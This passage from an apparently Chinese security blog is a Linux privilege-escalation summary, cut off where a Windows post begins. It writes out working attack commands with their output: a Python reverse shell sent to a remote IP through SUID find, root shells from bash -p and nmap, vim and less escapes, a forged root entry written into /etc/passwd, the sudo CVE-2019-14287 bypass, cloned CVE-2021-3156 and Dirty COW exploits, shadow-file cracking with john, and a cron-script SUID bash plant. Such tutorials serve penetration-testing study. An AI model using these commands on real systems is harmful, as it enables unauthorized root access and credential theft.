class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">查看发行版</span><br><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/*-release</span><br><span class="line">uname -a    打印所有可用的系统信息</span><br><span class="line">uname -r    内核版本</span><br><span class="line">uname -n    系统主机名。</span><br><span class="line">uname -m    查看系统内核架构（64位/32位）</span><br><span class="line">hostname    系统主机名</span><br><span class="line">cat /proc/version    内核信息</span><br><span class="line">cat /etc/*-release   分发信息</span><br></pre></td></tr></table></figure><p>例如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/Desktop$ cat /etc/issue</span><br><span class="line">Kali GNU/Linux Rolling \n \l</span><br><span class="line"></span><br><span class="line">kali@kali:~/Desktop$ cat /etc/*-release</span><br><span class="line">PRETTY_NAME=<span class="string">"Kali GNU/Linux Rolling"</span></span><br><span class="line">NAME=<span class="string">"Kali GNU/Linux"</span></span><br><span class="line">ID=kali</span><br><span class="line">VERSION=<span class="string">"2021.1"</span></span><br><span class="line">VERSION_ID=<span class="string">"2021.1"</span></span><br><span class="line">VERSION_CODENAME=<span class="string">"kali-rolling"</span></span><br><span class="line">ID_LIKE=debian</span><br><span class="line">ANSI_COLOR=<span class="string">"1;31"</span></span><br><span class="line">HOME_URL=<span class="string">"https://www.kali.org/"</span></span><br><span class="line">SUPPORT_URL=<span class="string">"https://forums.kali.org/"</span></span><br><span class="line">BUG_REPORT_URL=<span class="string">"https://bugs.kali.org/"</span></span><br><span class="line">kali@kali:~/Desktop$ uname -a</span><br><span class="line">Linux kali 5.7.0-kali1-amd64 <span class="comment">#1 SMP Debian 5.7.6-1kali2 (2020-07-01) x86_64 GNU/Linux</span></span><br><span class="line">kali@kali:~/Desktop$ uname -r </span><br><span class="line">5.7.0-kali1-amd64</span><br><span class="line">kali@kali:~/Desktop$ uname -n </span><br><span class="line">kali</span><br><span class="line">kali@kali:~/Desktop$ uname -m  </span><br><span class="line">x86_64</span><br></pre></td></tr></table></figure><h1 id="SUID-提权"><a href="#SUID-提权" class="headerlink" title="SUID 提权"></a>SUID 提权</h1><p><a href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html" target="_blank" rel="noopener">谈一谈Linux与suid提权</a>    </p><p>什么是suid？suid全称是Set owner User ID up on execution。这是Linux给可执行文件的一个属性。通俗的理解为其他用户执行这个程序的时候可以用该程序所有者/组的权限。需要注意的是，只有程序的所有者是0号或其他super user，同时拥有suid权限，才可以提权。</p><p>常见的可用来提权的Linux 可执行文件有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nmap, Vim, find, bash, more, less, nano, cp</span><br></pre></td></tr></table></figure><p>查看可以suid 提权的可执行文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ye1s@ye1s:~/Desktop$ ls -la /usr/bin/find</span><br><span class="line">-rwsr-xr-x 1 root root 320160 2月  18  2020 /usr/bin/find</span><br><span class="line">ye1s@ye1s:~/Desktop$ touch ye1s</span><br><span class="line">ye1s@ye1s:~/Desktop$ /usr/bin/find <span class="built_in">test</span> -<span class="built_in">exec</span> whoami \;</span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>反弹shell,结合python</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/find ye1s -<span class="built_in">exec</span> python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span> \;</span><br></pre></td></tr></table></figure><p>但是反弹的 shell 不是 root 权限，在本机上 find 执行 id 时，有一个 euid （euid 就是我们通常说的 suid， 或者叫 excute user id，它使文件执行时拥有该文件所有者的权限。）为 root 权限，但是反弹 shell 中并没有。</p><p>获取root权限的shell</p><p>默认情况下 bash 在执行时，如果发现 euid 和 uid 不匹配，会将 euid（即 suid） 强制重置为uid 。如果使用了 -p 参数，则不会再覆盖。      </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ye1s@ye1s:~/Desktop$ /usr/bin/find ye1s -<span class="built_in">exec</span> /bin/bash -p \;</span><br><span class="line">bash-5.0<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">bash-5.0<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ye1s@ye1s:~/Desktop$ cat /etc/passwd &gt;passwd</span><br><span class="line">ye1s@ye1s:~/Desktop$ openssl passwd -1 -salt r00t r00t123</span><br><span class="line"><span class="variable">$1</span><span class="variable">$r00t</span><span class="variable">$GBgW4V80tY8U8PF</span>.5VOUN1</span><br><span class="line">ye1s@ye1s:~/Desktop$ <span class="built_in">echo</span> <span class="string">'r00t:$1$r00t$GBgW4V80tY8U8PF.5VOUN1:0:0::/root/:/bin/bash'</span> &gt;&gt;passwd</span><br><span class="line">ye1s@ye1s:~/Desktop$ cp passwd /etc/passwd</span><br><span class="line">cp: cannot create regular file <span class="string">'/etc/passwd'</span>: Permission denied</span><br><span class="line">ye1s@ye1s:~/Desktop$ whereis cp</span><br><span class="line">cp: /usr/bin/cp /usr/share/man/man1/cp.1.gz</span><br><span class="line">ye1s@ye1s:~/Desktop$ ls -la /usr/bin/cp</span><br><span class="line">-rwxr-xr-x 1 root root 153976 9月   5  2019 /usr/bin/cp</span><br><span class="line">ye1s@ye1s:~/Desktop$ sudo chmod 4755 /usr/bin/cp</span><br><span class="line">[sudo] password <span class="keyword">for</span> ye1s: </span><br><span class="line">ye1s@ye1s:~/Desktop$ ls -la /usr/bin/cp</span><br><span class="line">-rwsr-xr-x 1 root root 153976 9月   5  2019 /usr/bin/cp</span><br><span class="line">ye1s@ye1s:~/Desktop$ cp passwd /etc/passwd</span><br><span class="line">ye1s@ye1s:~/Desktop$ su - r00t</span><br><span class="line">Password: </span><br><span class="line">root@ye1s:~<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@ye1s:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>较旧版本的Nmap（2.02至5.21）具有交互模式，允许用户执行shell命令。由于Nmap在使用root权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的shell。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -V</span><br></pre></td></tr></table></figure><p>Nmap - 版本识别</p><p>交互模式可以通过执行Nmap参数”interactive”</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --interactive</span><br></pre></td></tr></table></figure><p>Nmap - 交互模式</p><p>以下命令将提供一个提升的shell。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap&gt; !sh</span><br><span class="line">sh-3.2<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>提权至Root权限</p><p>也可以通过Metasploit模块对Nmap的二进制文件进行权限提升。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/unix/<span class="built_in">local</span>/setuid_nmap</span><br></pre></td></tr></table></figure><h2 id="VIM"><a href="#VIM" class="headerlink" title="VIM"></a>VIM</h2><p>Vim是Linux环境下的一款文件编辑器。但是，如果以SUID运行的话，它会继承root用户的权限，因此可以读取系统上的所有文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim.tiny /etc/shadow</span><br></pre></td></tr></table></figure><p>Vim - Shadow文件读取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim.tiny</span><br><span class="line"><span class="comment"># Press ESC key</span></span><br><span class="line">:<span class="built_in">set</span> shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><h2 id="less-and-more"><a href="#less-and-more" class="headerlink" title="less and more"></a>less and more</h2><p>less<br>less命令也可以进入shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">less /etc/passwd</span><br><span class="line"><span class="comment">#在less中输入:</span></span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure><p>more<br>more命令进入shell和less相同</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">more /etc/passwd</span><br><span class="line"><span class="comment">#在more中输入:</span></span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure><p>使用more和less一定读取一个比较大的文件，如果文件太小无法进入翻页功能，无法使用!命令进入shell</p><h2 id="利用bash提权"><a href="#利用bash提权" class="headerlink" title="利用bash提权"></a>利用bash提权</h2><p>以下命令将以root权限打开一个bash shell。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -p </span><br><span class="line">bash-3.2<span class="comment"># id</span></span><br></pre></td></tr></table></figure><h1 id="Sudo-提权"><a href="#Sudo-提权" class="headerlink" title="Sudo 提权"></a>Sudo 提权</h1><h2 id="CVE-2019-14287"><a href="#CVE-2019-14287" class="headerlink" title="CVE-2019-14287"></a>CVE-2019-14287</h2><p>[提权]sudo提权复现(CVE-2019-14287) <a href="https://www.cnblogs.com/-mo-/p/11683402.html" target="_blank" rel="noopener">https://www.cnblogs.com/-mo-/p/11683402.html</a> </p><p>该漏洞是一个sudo安全策略绕过问题，可导致恶意用户或程序在目标 Linux 系统上以 root 身份执行任意命令。个人觉得该漏洞比较鸡肋，因为需要特殊的配置才能触发，在默认的Linux中并不会存在该安全问题。</p><p>影响版本： </p><p>任何linux机器上执行sudo -V得到的版本 &lt; 1.8.28均可 </p><p>由于需要特定的配置，所以首先修改配置文件sudoers（文件位置/etc/sudoers）</p><p>在 root ALL=(ALL:ALL) ALL 下面添加一行配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">test</span>    ALL=(ALL,!root) ALL</span><br></pre></td></tr></table></figure><p>详解</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.其中的<span class="built_in">test</span>表示用户名</span><br><span class="line">2.第一个ALL表示允许该用户在任意机器或者终端中使用sudo</span><br><span class="line">3.括号里面的（ALL,!root）表示命令可以被除了root以外的任意用户身份去执行</span><br><span class="line">4.最后一个ALL表示被允许执行</span><br></pre></td></tr></table></figure><p>添加的这一行的配置的意思就是：test这个用户可以使用sudo命令，以除了root以外的任意身份去执行命令。</p><p>执行sudo -u#id whoami，这里的id可以去试任何id  </p><p><strong>尝试高权限操作</strong><br>执行cat /etc/shadow失败<br>执行sudo -u#-1 cat /etc/shadow成功   </p><p>使用 sudo -u#id 指定用户 id 去执行命令，由于可以指定id，所以可以使用-u#-1或者-u#4294967295绕过限制，从而以root身份去执行任意代码：这是因为 sudo 命令本身就已经以用户 ID 为0 运行，因此当 sudo 试图将用户 ID 修改成 -1时，不会发生任何变化。这就导致 sudo 日志条目将该命令报告为以用户 ID 为 4294967295而非 root （或者用户ID为 0）运行命令</p><h2 id="CVE-2021-3156"><a href="#CVE-2021-3156" class="headerlink" title="CVE-2021-3156"></a>CVE-2021-3156</h2><p>当sudo通过-s或-i命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或-i标志运行sudoedit时，实际上并未进行转义，从而可能导致缓冲区溢出。只要存在sudoers文件（通常是/etc/sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。    </p><p>影响版本：<br>Sudo 1.8.2 – 1.8.31p2<br>Sudo 1.9.0 – 1.9.5p1   </p><p>不受影响版本：<br>sudo =&gt;1.9.5p2   </p><p>检测方式 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudoedit -s /</span><br></pre></td></tr></table></figure><p>报错开头以sudoedit则存在漏洞，报错以usage开头，则不受影响  </p><p>下载exp并执行 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/blasty/CVE-2021-3156.git</span><br><span class="line">make</span><br><span class="line">./sudo-hax-me<span class="_">-a</span>-sandwich 0</span><br></pre></td></tr></table></figure><h1 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h1><p>在Linux系统中，涉及系统登陆密码的重要文件有两个：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd</span><br><span class="line"><span class="comment">#用户信息</span></span><br><span class="line">/etc/shadow</span><br><span class="line"><span class="comment">#密码信息</span></span><br></pre></td></tr></table></figure><p>Linux操作系统采用5中常用的加密算法，主要通过账号后面的$x进行判断</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$1</span>:Md5加密算法</span><br><span class="line"><span class="variable">$2</span>:Blowfish加密算法</span><br><span class="line"><span class="variable">$5</span>:sha-256加密算法</span><br><span class="line"><span class="variable">$6</span>:sha-512加密算法</span><br><span class="line">其他均为标准DES加密算法</span><br></pre></td></tr></table></figure><p>需要安装jhon</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo unshadow /etc/passwd /etc/shadow &gt; shadow</span><br></pre></td></tr></table></figure><p>生成一个名为shadow的密码文件，接下来使用密码字典进步暴力破解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ye1s@ye1s:~&#x2F;Desktop$ john --wordlist&#x3D;dict.txt --rules shadow</span><br><span class="line">Loaded 3 password hashes with 3 different salts (crypt, generic crypt(3) [?&#x2F;64])</span><br><span class="line">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">密码         (root)</span><br><span class="line">密码         (ye1s)</span><br><span class="line">2g 0:00:00:00 100% 33.33g&#x2F;s 200.0p&#x2F;s 600.0c&#x2F;s 600.0C&#x2F;s 123456..qw123!</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure><h1 id="内核提权-1"><a href="#内核提权-1" class="headerlink" title="内核提权"></a>内核提权</h1><p>Linux系统内核指的是一个由 Linus Torvalds 负责维护，提供硬件抽象层、硬盘及文件系统控制及多任务功能的系统核心程序。</p><p>Linux内核版本有两种：稳定版 和 开发版 ，Linux内核版本号由3组数字组成：第一个组数字.第二组数字.第三组数字</p><ul><li>第一个组数字：目前发布的内核主版本。</li><li>第二个组数字：偶数表示稳定版本；奇数表示开发中版本。</li><li>第三个组数字：错误修补的次数。</li></ul><p>如下，使用 uname -r 可以看到linux系统的发行版本号。3.10.0就是内核版本号。3就是内核主版本，10表示是稳定版，0表示错误修补次数是0。 而 123.el7.x86_64则是 redhat 的发行版本信息，123 代表编译123次，el7代表的是redhat7，x86_64则是64位系统。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ye1s@ye1s:~$ uname -r</span><br><span class="line">3.10.0-123.el7.x86_64</span><br></pre></td></tr></table></figure><p>检查linux提权辅助工具，les该工具主要帮助检测linux内核的安全缺陷。</p><p>下载地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/mzet-/linux-exploit-suggester</span><br></pre></td></tr></table></figure><p>将linux-exploit-suggester.sh下载到要检查的主机上，主要使用以下两条指令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod +x linux-exploit-suggester.sh</span><br><span class="line"></span><br><span class="line">./linux-exploit-suggester.sh</span><br></pre></td></tr></table></figure><p>利用kail的searchsploit,可以写更多的搜索字符串条件来缩小范围</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">e1s@kali:/usr/share/exploitdb/exploits/linux/dos$ searchsploit ubuntu 4.8.0</span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                                                                                     |  Path</span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Linux Kernel 4.10.5 / &lt; 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free                                                                                               | linux/dos/43234.c</span><br><span class="line">Linux Kernel 4.8.0-22/3.10.0-327 (Ubuntu 16.10 / RedHat) - <span class="string">'keyctl'</span> Null Pointer Dereference                                                                       | linux/dos/40762.c</span><br><span class="line">Linux Kernel 4.8.0-34 &lt; 4.8.0-45 (Ubuntu / Linux Mint) - Packet Socket Local Privilege Escalation                                                                  | linux/<span class="built_in">local</span>/47168.c</span><br><span class="line">Linux Kernel 4.8.0-41-generic (Ubuntu) - Packet Socket Local Privilege Escalation                                                                                  | linux/<span class="built_in">local</span>/41994.c</span><br><span class="line">Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                                                                      | linux/<span class="built_in">local</span>/45010.c</span><br><span class="line">Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                                                              | linux/<span class="built_in">local</span>/43418.c</span><br><span class="line">Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP)                                          | linux/<span class="built_in">local</span>/47169.c</span><br><span class="line">Ubuntu &lt; 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege Escalation                                                                             | linux/<span class="built_in">local</span>/41760.txt</span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure><p>exp的路径为相对路径，还需加上/usr/share/exploitdb/exploits/，<br>需要漫长地点开exp看具体要求的筛选过程，大部分exp都会写清生效条件。因此虽然很气，但也很快地去掉一些不具备利用条件的exp。  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#gcc exp.c</span></span><br><span class="line"><span class="comment">#./a.out</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root)</span><br></pre></td></tr></table></figure><p><strong>脏牛漏洞提权(CVE-2016-5195)</strong><br>影响版本<br>Linux 内核2.6.22 &lt; 3.9   </p><p><a href="https://github.com/FireFart/dirtycow" target="_blank" rel="noopener">https://github.com/FireFart/dirtycow</a>   </p><p>编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br></pre></td></tr></table></figure><p>运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./dirty</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./dirty my-new-password</span><br></pre></td></tr></table></figure><p>然后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su firefart</span><br></pre></td></tr></table></figure><h1 id="Crontab"><a href="#Crontab" class="headerlink" title="Crontab"></a>Crontab</h1><p>Crontab通常以root权限运行。如果可以成功篡改在定时任务执行的任何脚本或二进制文件，那么我们可以使用root权限执行任意代码。   </p><p>crontab命令用来定期执行程序。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-e   编辑当前的crontab文件，默认保存在/var/spool/cron/用户名下</span><br><span class="line">-r   删除目前的时程表</span><br><span class="line">-l   列出目前的时程表</span><br></pre></td></tr></table></figure><p>语法格式</p><p>分 时 日 月 周 需要执行的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">分：0~59</span><br><span class="line">时：0~23</span><br><span class="line">日：1~31</span><br><span class="line">月：1~12</span><br><span class="line">周：0~6 <span class="comment">#0代表周日</span></span><br><span class="line">*：（星号）代表取值范围中的每一个数字</span><br><span class="line">-：（减号）连续区间表达式，想要代表1~7，则需要写成1-7</span><br><span class="line">/：（斜杠）表示每x个。例如想在每10分钟执行一次，则在分的位置写：*/10</span><br><span class="line">,：（逗号）表示多个取值。如果想在1点，3点，5点执行一次，则在时的位置写：1,3,5</span><br></pre></td></tr></table></figure><p>如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/2 * * * * <span class="built_in">echo</span> `date` &gt;&gt; /tmp/stu01</span><br></pre></td></tr></table></figure><p>表示每两分钟输出时间到/tmp/stu01文件</p><p>/var/spool/cron/user 用来区分每个用户自己的执行计划</p><p>而 /etc/crontab 表示系统执行计划，需要在五个<code>*</code>后面加上用户<br>如编辑/etc/crontab 文件</p><p>如添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/1 * * * * root  ls /&gt;&gt; /tmp/cron</span><br></pre></td></tr></table></figure><p>表示每分钟执行ls命令并输出到/tmp/cron 文件。</p><p>假如root用户配置不当，在/etc/crontab文件创建了一个计划任务。<br>意为每分钟执行test.sh文件并输出到/tmp/test.txt文件。<br>查看该test.sh文件以cseroad用户身份运行。</p><p>我们可以通过覆盖test.sh文件提升为root权限。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"cp /bin/bash /tmp/bash; chmod +s /tmp/bash"</span> &gt;&gt; test.sh</span><br></pre></td></tr></table></figure><p>几分钟后，tmp目录下会创建出SUID权限的bash。</p><p>/tmp/bash -p 即可获取root权限</p><h1 id="第三方服务提权"><a href="#第三方服务提权" class="headerlink" title="第三方服务提权"></a>第三方服务提权</h1><p>第三方服务提权<br>我们还可以查看主机上其他的第三方服务，利用第三方服务的漏洞可以拿到主机的 root 权限。比如如果主机的mysql或tomcat是用root权限启动的，而我们又通过漏洞拿到了mysql或tomcat的权限，就相当于获得了root的权限。</p><h1 id="密码复用"><a href="#密码复用" class="headerlink" title="密码复用"></a>密码复用</h1><p>很多管理员会重复使用密码，因此数据库或者web后台的密码也许就是root密码。</p><p>参考文章：<br><a href="https://xie1997.blog.csdn.net/article/details/97180489" target="_blank" rel="noopener">Linux提权总结_谢公子博客</a></p><p><a href="https://www.hacking8.com/tiquan/other/Linux%E6%8F%90%E6%9D%83.html" target="_blank" rel="noopener">https://www.hacking8.com/tiquan/other/Linux%E6%8F%90%E6%9D%83.html</a></p><p>对Linux 提权的简单结:<a href="https://blog.csdn.net/weixin_41679427/article/details/110311694" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41679427/article/details/110311694</a></p><p>Linux提权之Suid提权：<a href="https://www.secice.cn/p/a20c8cf4" target="_blank" rel="noopener">https://www.secice.cn/p/a20c8cf4</a><br>sudo提权总结：  <a href="https://www.jianshu.com/p/71cb0ee0f0ea" target="_blank" rel="noopener">https://www.jianshu.com/p/71cb0ee0f0ea</a><br>linux 提权-Crontab提权:<a href="https://www.jianshu.com/p/039cc25c03dd" target="_blank" rel="noopener">https://www.jianshu.com/p/039cc25c03dd</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;当拿到了一台Linux服务器的低权限账号，想要通过技术手段提权至 root 用户权限，以执行更多的操作。&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>window提权总结</title>
    <link href="https://blog.cfyqy.com/article/bde10ad7.html"/>
    <id>https://blog.cfyqy.com/article/bde10ad7.html</id>
    <published>2021-06-21T09:03:09.000Z</published>
    <updated>2021-07-20T09:53:50.402Z</updated>
    
    <content type="html"><![CDATA[<p>window提权  </p><a id="more"></a> <p>Windows是一个支持多用户、多任务的操作系统，这是权限设置的基础，一切权限设置都是基于用户和进程而言的，不同的用户在访问这台计算机时，将会有不同的权限。</p><p>WindowsNT用户组：</p><ul><li>Administrators：管理员组，默认情况下，Administrators中的用户对计算机/域有不受限制的完全访问权。</li><li>Power Users：高级用户组,Power Users 可以执行除了为</li><li>Administrators 组保留的任务外的其他任何操作系统任务。</li><li>Users：普通用户组,这个组的用户无法进行有意或无意的改动。</li><li>Guests：来宾组,来宾跟普通Users的成员有同等访问权，但来宾帐户的限制更多</li><li>Everyone：所有的用户，这个计算机上的所有用户都属于这个组。</li></ul><p>提权最重要的就是收集信息了，根据收集到的信息再进行攻击。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">服务器系统和版本位数</span><br><span class="line">服务器的补丁情况</span><br><span class="line">服务器的安装软件情况</span><br><span class="line">服务器的防护软件情况</span><br><span class="line">端口情况</span><br></pre></td></tr></table></figure><p>收集好信息，就可以先从这几个方面入手：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">确定是否能执行命令（如果不能调用系统cmd执行命令。 要上传一个cmd.exe）</span><br><span class="line">找一个可写可执行的目录</span><br><span class="line">通过查找的补丁信息,找相应的exp提权</span><br></pre></td></tr></table></figure><h1 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h1><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>systeminfo</td><td>打印系统信息</td></tr><tr><td>whoami</td><td>获得当前用户名</td></tr><tr><td>Set</td><td>环境变量</td></tr><tr><td>whoami 